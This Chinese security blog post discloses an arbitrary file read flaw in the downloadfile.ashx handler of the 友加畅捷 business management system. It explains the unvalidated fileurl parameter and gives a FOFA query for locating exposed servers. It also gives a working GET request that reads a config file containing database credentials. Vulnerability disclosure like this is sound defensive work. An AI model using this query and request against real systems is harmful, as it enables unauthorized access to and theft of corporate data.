---
title: "友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞"
source: https://mrxn.net/jswz/youjiasoft-downloadfile-file-read.html
asset_dir: assets/友加畅捷管理系统-downloadfile.ashx-任意文件读取漏洞
---

# 友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/24 12:22
- 569浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

服务器安全服务

编码转换工具

漏洞扫描器

---

# 漏洞简介

友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理[软件](#)，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

漏洞扫描服务

该系统的 `downloadfile.ashx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。

# 影响版本

13.7004.1053.1000

# fofa语法

> icon\_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="

# 漏洞分析

直接查看 `/Controllers/ajax/downloadfile.ashx` 文件的代码引用

软件

```
<%@ WebHandler Language="C#" CodeBehind="downloadfile.ashx.cs" Class="CnSub.Web.Controllers.ajax.downloadfile" %>
```

深入探索

云安全解决方案

企业安全咨询

网络安全培训

直接在 `bin` 目录下反编译 `CnSub.Web.dll` 获取 **Controllers.ajax.downloadfile** 处理逻辑

[![友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞](images/img-001-262138e43628.webp)](https://image.mrxn.net/dffaeb71f50a4f34930f7adca3ac7057.webp)

GET请求参数 `fileurl` 被直接拼接在网站根目录下，然后带入 `new FileStream` 方法进行操作，期间无任何过滤或校验，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
GET /Controllers/ajax/downloadfile.ashx?fileurl=config/sysconfig_zts.fig HTTP/1.1
Host: youjiasoft.mrxn.net
```

[![友加畅捷管理系统 downloadfile.ashx 任意文件读取漏洞](images/img-002-c5b1d3199cc5.webp)](https://image.mrxn.net/5829a73ea3c14a5192b73deada5e113d.webp)

成功读取到 `config/sysconfig_zts.fig` 文件内容，其中包含数据库连接信息。

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
